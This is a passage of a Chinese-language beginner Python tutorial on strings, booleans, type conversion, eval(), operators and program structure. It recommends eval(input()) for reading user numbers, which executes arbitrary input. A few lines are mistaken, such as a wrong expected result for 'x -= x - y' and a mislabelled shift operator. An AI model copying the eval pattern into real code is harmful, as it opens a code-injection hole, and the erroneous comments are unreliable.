class="hljs-string">&#x27;北京欢迎你&#x27;</span>[4])  # 获取字符串中索引为4<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京欢迎你&#x27;</span>[-1])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;--------------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(s[2:7])  # 从2开始到7结束，不包含7 正向递增<br><span class="hljs-built_in">print</span>(s[-8:-3])  # 反向递减<br><span class="hljs-built_in">print</span>(s[:5])  # 默认N从0开始<br><span class="hljs-built_in">print</span>(s[5:])  # M 默认是切到字符串的结尾<br><br></code></pre></td></tr></table></figure><h4 id="常用的字符串操作"><a href="#常用的字符串操作" class="headerlink" title="常用的字符串操作"></a>常用的字符串操作</h4><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170506733.png" alt="image-20251024142020014"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#示例3-11字符串类型的操作</span><br>x = <span class="hljs-string">&#x27;2022年&#x27;</span><br>y = <span class="hljs-string">&#x27;北京冬奥会&#x27;</span><br><span class="hljs-built_in">print</span>(x + y)  # 连接两个字符<br><span class="hljs-built_in">print</span>(x * 10)  # 对x这个字符串的内容复制10次<br><span class="hljs-built_in">print</span>(10 * x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;北京&#x27;</span> <span class="hljs-keyword">in</span> y)  # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;上海&#x27;</span> <span class="hljs-keyword">in</span> y)  # <span class="hljs-literal">False</span><br><br></code></pre></td></tr></table></figure><h3 id="4-布尔类型"><a href="#4-布尔类型" class="headerlink" title="4.布尔类型"></a>4.布尔类型</h3><ul><li>用来表示“真”值或“假”值的数据类型 </li><li>在Python中使用标识符True或False标示布尔类型的值 </li><li>True表示整数1，False表示整数0</li></ul><h4 id="布尔值为False的情况如下"><a href="#布尔值为False的情况如下" class="headerlink" title="布尔值为False的情况如下"></a>布尔值为False的情况如下</h4><ul><li>False或者是None </li><li>数值中的0，包含0，0.0，虚数0 </li><li>空序列，包含空字符串、空元组、空列表、空字典、空集合 </li><li>自定义对象的实例，该对象的__bool__()方法返回False或__len__()方法返回0</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例3-12布尔类型的使用</span><br>x = <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(type(x))<br><span class="hljs-built_in">print</span>(x + 10)  # 11   --&gt;1+10<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">False</span> + 10)  # 10--&gt;0+10<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------------&#x27;</span>)<br><span class="hljs-built_in">print</span>(bool(18))  # 测试一下整数18的布尔值<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(bool(0), bool(0.0))  # <span class="hljs-literal">False</span><br><span class="hljs-comment"># 总结，非O的整数的布尔值都是True</span><br><span class="hljs-built_in">print</span>(bool(<span class="hljs-string">&#x27;北京欢迎你&#x27;</span>))  # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(bool(<span class="hljs-string">&#x27;&#x27;</span>))  # <span class="hljs-literal">False</span><br><span class="hljs-comment"># 所有非空字符串的布尔值都是True</span><br><span class="hljs-built_in">print</span>(bool(<span class="hljs-literal">False</span>))<br><br></code></pre></td></tr></table></figure><h3 id="5-数据类型之间的转换"><a href="#5-数据类型之间的转换" class="headerlink" title="5.数据类型之间的转换"></a>5.数据类型之间的转换</h3><ul><li><p>类型转换–&gt;（1）隐式转换 （2）显示转换</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170510003.png" alt="image-20251024142148150"></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170513754.png" alt="image-20251024142156346"></p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs processing">#示例<span class="hljs-number">3</span><span class="hljs-number">-13</span>数据类型之间的转换<br>x = <span class="hljs-number">10</span><br>y = <span class="hljs-number">3</span><br>z = x / y  # 执行除法运算的时候，将运算的结果赋值给z<br><span class="hljs-built_in">print</span>(z, <span class="hljs-title function_">type</span>(z))  # 隐式转换，通过运算隐式的转了结果的类型<br># <span class="hljs-type">float</span>类型转成<span class="hljs-type">int</span>类型，只保留整数部分<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;float类型转成int类型：&quot;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">3.14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;float类型转成int类型：&quot;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">3.9</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;float类型转成int类型：&quot;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">-3.14</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;float类型转成int类型：&quot;</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">-3.9</span>))<br># 将<span class="hljs-type">int</span>转成<span class="hljs-type">float</span>类型<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;将int转成float类型：&#x27;</span>, <span class="hljs-built_in">float</span>(<span class="hljs-number">10</span>))<br># 将<span class="hljs-built_in">str</span>转成<span class="hljs-type">int</span>类型<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;100&#x27;</span>) + <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;200&#x27;</span>))<br># 将字符串转成<span class="hljs-type">int</span>或<span class="hljs-type">float</span>时报错的情况<br># <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;18a&#x27;</span>)) # ValueError: invalid literal <span class="hljs-keyword">for</span> <span class="hljs-built_in">int</span>() with base <span class="hljs-number">10</span>: <br><span class="hljs-string">&#x27;18a&#x27;</span><br># <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;3.14&#x27;</span>)) # ValueError: invalid literal <span class="hljs-keyword">for</span> <span class="hljs-built_in">int</span>() with base <span class="hljs-number">10</span>: <br><span class="hljs-string">&#x27;3.14&#x27;</span><br># <span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;45a.987&#x27;</span>)) # ValueError: could not convert string to <span class="hljs-type">float</span>: <br><span class="hljs-string">&#x27;45a.987&#x27;</span><br># <span class="hljs-title function_">chr</span>()<span class="hljs-title function_">ord</span>()一对、<br><span class="hljs-built_in">print</span>(<span class="hljs-title function_">ord</span>(<span class="hljs-string">&#x27;张&#x27;</span>))  # 张在unicode表中对应的整数值<br><span class="hljs-built_in">print</span>((<span class="hljs-title function_">chr</span>(<span class="hljs-number">24352</span>)))  # <span class="hljs-number">24352</span>整数在unicode表中对应的字符是什么<br># 进制之间的转换操作，十进制与其他进制之间的转换<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;十进制转成十六进制：&#x27;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-number">23452</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;十进制转成八进制：&#x27;</span>, <span class="hljs-title function_">oct</span>(<span class="hljs-number">23452</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;十进制转成二进制：&#x27;</span>, <span class="hljs-title function_">bin</span>(<span class="hljs-number">23452</span>))<br></code></pre></td></tr></table></figure><h2 id="4-eval函数"><a href="#4-eval函数" class="headerlink" title="4.eval函数"></a>4.eval函数</h2><h3 id="1-eval函数："><a href="#1-eval函数：" class="headerlink" title="1.eval函数："></a>1.eval函数：</h3><ul><li>Python中的内置函数 </li><li>用于去掉字符串最外侧的引号，并按照Python语句方式去掉引号后的字符串 </li><li>eval（）函数经常和input（）函数一起使用</li></ul><h3 id="2-eval的语法格式"><a href="#2-eval的语法格式" class="headerlink" title="2.eval的语法格式"></a>2.eval的语法格式</h3><p>变量&#x3D;eval（字符串）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vim"># 示例<span class="hljs-number">3</span>-<span class="hljs-number">14</span><span class="hljs-built_in">eval</span>函数的使用<br>s = <span class="hljs-string">&#x27;3.14+3&#x27;</span><br><span class="hljs-keyword">print</span>(s, <span class="hljs-built_in">type</span>(s))<br><span class="hljs-keyword">x</span> = <span class="hljs-built_in">eval</span>(s)  # 使用<span class="hljs-built_in">eval</span>函数去掉s这个字符串中左右的引号，执行加法运算<br><span class="hljs-keyword">print</span>(<span class="hljs-keyword">x</span>, <span class="hljs-built_in">type</span>(<span class="hljs-keyword">x</span>))<br># <span class="hljs-built_in">eval</span>函数经常与<span class="hljs-built_in">input</span>()函数一起使用，用来获取用户输入的数值<br>age = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入您的年龄：&#x27;</span>))  # 将字符串类型转成了<span class="hljs-keyword">int</span>类型，相当于<span class="hljs-keyword">int</span>(age)<br><span class="hljs-keyword">print</span>(age, (<span class="hljs-built_in">type</span>(age)))<br>height = <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入您的身高：&#x27;</span>))<br><span class="hljs-keyword">print</span>(height, <span class="hljs-built_in">type</span>(height))<br>hello = <span class="hljs-string">&#x27;北京欢迎你&#x27;</span><br><span class="hljs-keyword">print</span>(hello)<br><span class="hljs-keyword">print</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;hello&#x27;</span>))  # 输出了“北京欢迎你”<br># <span class="hljs-keyword">print</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;北京欢迎你&#x27;</span>)) #NameError: name <span class="hljs-string">&#x27;北京欢迎你&#x27;</span> <span class="hljs-keyword">is</span> not defined<br><br></code></pre></td></tr></table></figure><h2 id="5-算术运算符"><a href="#5-算术运算符" class="headerlink" title="5.算术运算符"></a>5.算术运算符</h2><h3 id="算术运算符：用于处理四则运算的符号"><a href="#算术运算符：用于处理四则运算的符号" class="headerlink" title="算术运算符：用于处理四则运算的符号"></a>算术运算符：用于处理四则运算的符号</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170746132.png" alt="image-20251024142339587"></p><h3 id="算数运算符的优先级由高到低的是："><a href="#算数运算符的优先级由高到低的是：" class="headerlink" title="算数运算符的优先级由高到低的是："></a>算数运算符的优先级由高到低的是：</h3><p>第一级：**</p><p>第二级：*、&#x2F;、%、&#x2F;&#x2F; </p><p>第三级：+、-</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例3-15算数运算符的使用</span><br><span class="hljs-attribute">print</span>(&#x27;加法&#x27;,<span class="hljs-number">1</span>+<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(&#x27;减法&#x27;,<span class="hljs-number">1</span>-<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(&#x27;乘法&#x27;,<span class="hljs-number">2</span>*<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(&#x27;除法&#x27;,<span class="hljs-number">10</span>/<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(&#x27;整除&#x27;,<span class="hljs-number">10</span>//<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(&#x27;取余&#x27;,<span class="hljs-number">10</span>%<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(&#x27;幂运算&#x27;,<span class="hljs-number">2</span>**<span class="hljs-number">4</span>) # <span class="hljs-number">2</span>*<span class="hljs-number">2</span>*<span class="hljs-number">2</span>*<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">10</span>/<span class="hljs-number">0</span>) # ZeroDivisionError: division by zero<br></code></pre></td></tr></table></figure><h2 id="6-赋值运算符"><a href="#6-赋值运算符" class="headerlink" title="6.赋值运算符"></a>6.赋值运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170743995.png" alt="image-20251024142422789"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例3-16赋值运算符的使用</span><br><span class="hljs-attribute">x</span> = <span class="hljs-number">20</span>  # 直接赋值，直接将<span class="hljs-number">20</span>赋值给左侧的变量x<br><span class="hljs-attribute">y</span> = <span class="hljs-number">10</span><br><span class="hljs-attribute">x</span> = x + y  # 将x+y的和赋值给x，x的值为<span class="hljs-number">30</span><br><span class="hljs-attribute">print</span>(x)  # x的值是<span class="hljs-number">30</span><br><span class="hljs-attribute">x</span> += y  # <span class="hljs-number">40</span> 相当于x=x+y<br><span class="hljs-attribute">x</span> -= x - y  # 相当于x=x-y<br><span class="hljs-attribute">print</span>(x)  # <span class="hljs-number">30</span><br><span class="hljs-attribute">x</span> *= y<br><span class="hljs-attribute">print</span>(x)  # <span class="hljs-number">300</span><br><span class="hljs-attribute">x</span> /= y<br><span class="hljs-attribute">print</span>(x)  # <span class="hljs-number">30</span>.<span class="hljs-number">0</span> 发生了类型转换 x的数据类型为float类型<br><span class="hljs-attribute">print</span>(type(x))  # &lt;class &#x27;float&#x27;&gt;<br><span class="hljs-attribute">x</span> %= <span class="hljs-number">2</span>  # 相当于x=x%<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(x)  # <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">z</span> = <span class="hljs-number">3</span><br><span class="hljs-attribute">y</span> //= z  # 相当于y=y//z<br><span class="hljs-attribute">print</span>(y)  # <span class="hljs-number">3</span><br><span class="hljs-attribute">y</span> **= <span class="hljs-number">2</span>  # 相当于y=y**<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(y)  # <span class="hljs-number">9</span><br><span class="hljs-comment"># Python支持链式赋值</span><br><span class="hljs-attribute">a</span> = b = c = <span class="hljs-number">100</span>  # 相当于执行 a=<span class="hljs-number">100</span> b=<span class="hljs-number">100</span> c=<span class="hljs-number">100</span><br><span class="hljs-attribute">print</span>(a, b, c)<br><span class="hljs-comment"># Python支持系列解包赋值</span><br><span class="hljs-attribute">a</span>, b = <span class="hljs-number">10</span>, <span class="hljs-number">20</span>  # 相当于执行了a=<span class="hljs-number">10</span> b=<span class="hljs-number">20</span><br><span class="hljs-attribute">print</span>(a, b)<br><span class="hljs-attribute">print</span>(&#x27;----如何交换两个变量的值呢？----&#x27;)<br><span class="hljs-attribute">a</span>, b = b, a  # 将b的值赋给a，将a的值赋给b<br><span class="hljs-attribute">print</span>(a, b)<br></code></pre></td></tr></table></figure><h2 id="7-比较运算符"><a href="#7-比较运算符" class="headerlink" title="7.比较运算符"></a>7.比较运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170749996.png" alt="image-20251024142447404"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 示例3-17比较运算符的使用</span><br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>大于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>&gt;<span class="hljs-number">90</span>)<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>小于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>&lt;<span class="hljs-number">90</span>)<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>等于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>==<span class="hljs-number">90</span>)<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>不等于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>!=<span class="hljs-number">90</span>)<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>大于等于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>&gt;=<span class="hljs-number">90</span>)<br><span class="hljs-attribute">print</span>(&#x27;<span class="hljs-number">98</span>小于等于<span class="hljs-number">90</span>吗？&#x27;,<span class="hljs-number">98</span>&lt;=<span class="hljs-number">90</span>)<br></code></pre></td></tr></table></figure><h2 id="8-逻辑运算符"><a href="#8-逻辑运算符" class="headerlink" title="8.逻辑运算符"></a>8.逻辑运算符</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170751621.png" alt="image-20251024142503907"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例3-18逻辑运算符的使用</span><br><span class="hljs-built_in">print</span>(<span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">False</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">False</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span><span class="hljs-number">*30</span>)<br><span class="hljs-built_in">print</span>(8 &gt; 7 <span class="hljs-keyword">and</span> 6 &gt; 5)  # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(8 &gt; 7 <span class="hljs-keyword">and</span> 6 &lt; 5)  # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(8 &lt; 7 <span class="hljs-keyword">and</span> 10 &lt; 0)  #<span class="hljs-literal">False</span>,10/0并没有运算，当第一个表达式的结果为<span class="hljs-literal">False</span>，直接得<br>结果，不会计算<span class="hljs-keyword">and</span>右侧的表达式了<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span><span class="hljs-number">*30</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-literal">False</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">False</span>) #<span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(<span class="hljs-literal">False</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span><span class="hljs-number">*30</span>)<br><span class="hljs-built_in">print</span>(8&gt;7 <span class="hljs-keyword">or</span> 10/0) #<span class="hljs-literal">True</span>,表达式结果为<span class="hljs-literal">True</span>时，<span class="hljs-keyword">or</span>的右侧表达式根本不执行运算符<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&#x27;</span><span class="hljs-number">*30</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-keyword">not</span> <span class="hljs-literal">True</span>) #<span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(<span class="hljs-keyword">not</span> <span class="hljs-literal">False</span>) #<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(<span class="hljs-keyword">not</span> (8&gt;7))<br></code></pre></td></tr></table></figure><h2 id="9-位运算符"><a href="#9-位运算符" class="headerlink" title="9.位运算符"></a>9.位运算符</h2><h3 id="1-位运算符："><a href="#1-位运算符：" class="headerlink" title="1.位运算符："></a>1.位运算符：</h3><p>把数字看作二进制数来进行计算的</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170755625.png" alt="image-20251024142531892"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170754819.png" alt="image-20251024142534282"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170758224.png" alt="image-20251024142540337"></p><h3 id="2-“左移位”运算（"><a href="#2-“左移位”运算（" class="headerlink" title="2.“左移位”运算（&lt;&lt;）"></a>2.“左移位”运算（&lt;&lt;）</h3><p>是将一个二进制数向左移动指定的位数，左边（高位端）溢出的位被丢弃，右边（低位端）的空位用0补充</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170759775.png" alt="image-20251024142601879"></p><h3 id="3-“右移位”运算（"><a href="#3-“右移位”运算（" class="headerlink" title="3.“右移位”运算（&lt;&lt;）"></a>3.“右移位”运算（&lt;&lt;）</h3><p>将一个二进制数向右移动指定的位数，右边（低位端）溢出的位被丢弃，左边（高位端）的空位端，如 果最高位是0（正数）左侧空位填0，如果最高位是1（负数），左侧空位填1。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170801706.png" alt="image-20251024142619061"></p><h3 id="4-运算符的优先级"><a href="#4-运算符的优先级" class="headerlink" title="4.运算符的优先级"></a>4.运算符的优先级</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170803173.png" alt="image-20251024142629337"></p><h2 id="10-第三章本章总结"><a href="#10-第三章本章总结" class="headerlink" title="10.第三章本章总结"></a>10.第三章本章总结</h2><ul><li>保留字是Python已经被赋予特定意义的一些单词，保留字严格区分大小写</li><li>标识符可用来给变量、函数、类、模块和其他对象命名 </li><li>标识符的命名规则： <ul><li>可以是字母（包含中文）、数字、下划线，第一个字符不能是数字 </li><li>不能是Python中的保留字 </li><li>标识符严格区分大小写 </li><li>以下划线开头的标识符有特殊意义，不能随便使用 </li><li>允许使用中文作为标识符，但不建议使用</li></ul></li><li>变量的语法结构： 变量名&#x3D;value </li><li>整数类型有四种表示形式：二进制、八进制、十进制和十六进制 </li><li>浮点数可以使用内置函数round()限定运算结果需要保留的小数位数 </li><li>字符串又称为不可变字符序列，可根据索引检索元素，也可根据索引引进行切片操作 </li><li>布尔类型有两种取值True和False </li><li>常用的数据类型转换函数为int()、float()和str() </li><li>内置函数eval()可接字符串转换成真实的数据类型 </li><li>算术运算符：+、-、＊、&#x2F;、&#x2F;&#x2F;、%、**</li><li>赋值运算符：&#x3D;、+&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、&#x2F;&#x2F;&#x3D;、%&#x3D;、**&#x3D; </li><li>比较运算符：&gt;、&gt;&#x3D;、&lt;、&lt;&#x3D;、&#x3D;&#x3D;、!&#x3D; </li><li>逻辑运算符：and、or、not 位运算符：&amp;、|、Λ、~、&lt;&lt;、&gt;&gt;</li></ul><h1 id="第四章-程序的流程控制"><a href="#第四章-程序的流程控制" class="headerlink" title="第四章 程序的流程控制"></a>第四章 程序的流程控制</h1><h2 id="1-本章目标-1"><a href="#1-本章目标-1" class="headerlink" title="1.本章目标"></a>1.本章目标</h2><ul><li>了解程序的描述方式 </li><li>了解程序的组织结构 </li><li>掌握顺序结构 </li><li>掌握循环结构for与while </li><li>掌握程序跳转语句break和continue </li><li>掌握pass空语句</li></ul><h2 id="2-程序描述的方式"><a href="#2-程序描述的方式" class="headerlink" title="2.程序描述的方式"></a>2.程序描述的方式</h2><h3 id="1-自然语言"><a href="#1-自然语言" class="headerlink" title="1.自然语言"></a>1.自然语言</h3><p>自然语言就是使用人类语言、直接描述程序</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170810570.png" alt="image-20251024142909937"></p><h3 id="2-流程图"><a href="#2-流程图" class="headerlink" title="2.流程图"></a>2.流程图</h3><p>流程图是用一系列图形、流程线和文字说明描述程序的基本操作和控制流程主要适用于较短的算法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170815148.png" alt="image-20251024142930308"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170816437.png" alt="image-20251024142933427"></p><h3 id="3-伪代码"><a href="#3-伪代码" class="headerlink" title="3.伪代码"></a>3.伪代码</h3><p>伪代码是介于自然语言和编程语言之间的一种算法描述语言，如果程序比较小，可以直接使用代码描述</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170820358.png" alt="image-20251024142956721"></p><h2 id="3-程序的组织结构"><a href="#3-程序的组织结构" class="headerlink" title="3.程序的组织结构"></a>3.程序的组织结构</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170821996.png" alt="image-20251024143008574"></p><h3 id="1-顺序结构"><a href="#1-顺序结构" class="headerlink" title="1.顺序结构"></a>1.顺序结构</h3><p>顺序结构按程序语句的自然顺序，从上到下，依次执行每条语句的程序</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027170825483.png" alt="image-20251024143024439"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 示例4-1顺序结构的语句</span><br><span class="hljs-comment"># 赋值运算符的顺序 从右到左</span><br><span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;张三&#x27;</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-attribute">a</span>=b=c=d=100 # 链式赋值<br>a,b,c,<span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;room&#x27;</span># 字符中分解值<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;---------输入/输出语句也是典型的顺序结构----------&#x27;</span>)<br><span class="hljs-attribute">name</span>=input(&#x27;请输入您的姓名:&#x27;)<br><span class="hljs-attribute">age</span>=eval(input(&#x27;请输入您的年龄：&#x27;))<br><span class="hljs-attribute">luck_number</span>=eval(input(&#x27;请输入您的幸运数字：&#x27;))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;姓名：&#x27;</span>,name)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;年龄：&#x27;</span>,age)<br><span class="hljs-built_in">print</span>(<span 